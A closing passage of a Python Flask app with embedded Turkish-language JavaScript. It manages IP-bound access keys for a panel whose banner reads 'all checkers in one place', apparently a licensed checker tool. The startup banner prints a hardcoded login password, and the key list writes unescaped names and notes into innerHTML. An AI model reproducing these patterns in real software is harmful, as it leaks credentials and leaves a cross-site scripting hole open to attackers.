    if(!isAdmin)return;
    fetch("/api/admin/keys?key="+encodeURIComponent(currentKey)).then(r=>r.json()).then(d=>{
        if(d.error){alert(d.error);return;}
        var list=document.getElementById("keyList");
        var html="";
        for(var k in d){
            var v=d[k];
            var exp=v.expires?new Date(v.expires).toLocaleString():"Süresiz";
            var ip=v.bound_ip||"Bağlanmamış";
            var used=v.used?"✅ Kullanıldı":"❌ Kullanılmadı";
            html+='<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong style="font-size:13px">'+k+'</strong><br><small style="color:var(--muted);font-size:10px">'+v.note+' | '+exp+' | IP: '+ip+' | '+used+'</small></div><button class="btn sm r" onclick="deleteKey(\''+k+'\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
        }
        list.innerHTML=html||'<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
    });
}
function generateKey(){
    if(!isAdmin)return;
    var note=document.getElementById("genNote").value||"Oluşturuldu";
    var hours=document.getElementById("genHours").value;
    fetch("/api/admin/generate",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({master_key:currentKey,note:note,hours:hours})})
    .then(r=>r.json()).then(d=>{
        if(d.success){alert("Key Oluşturuldu!\n\nKey: "+d.key+"\nBitiş: "+d.expires);loadKeys();}
        else alert("Başarısız: "+(d.error||""));
    });
}
function deleteKey(target){
    if(!isAdmin)return;
    if(!confirm("Bu anahtarı sil?"))return;
    fetch("/api/admin/delete",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({master_key:currentKey,target_key:target})})
    .then(r=>r.json()).then(d=>{if(d.success)loadKeys();else alert("Silinemedi");});
}
</script>
</body>
</html>
"""

# ============================================================
# BAŞLAT
# ============================================================
if __name__ == "__main__":
    if not os.path.exists(KEYS_FILE):
        save_keys({})
    port = int(os.environ.get("PORT", 5000))
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔱 RODA - TÜM CHECKER'LAR TEK YERDE                        ║
    ║     http://0.0.0.0:""" + str(port) + """                               ║
    ║     Giriş: Roda@2026#Secure!X7                                ║
    ║     Kar taneleri, 1 Key 1 IP, Loglar                         ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
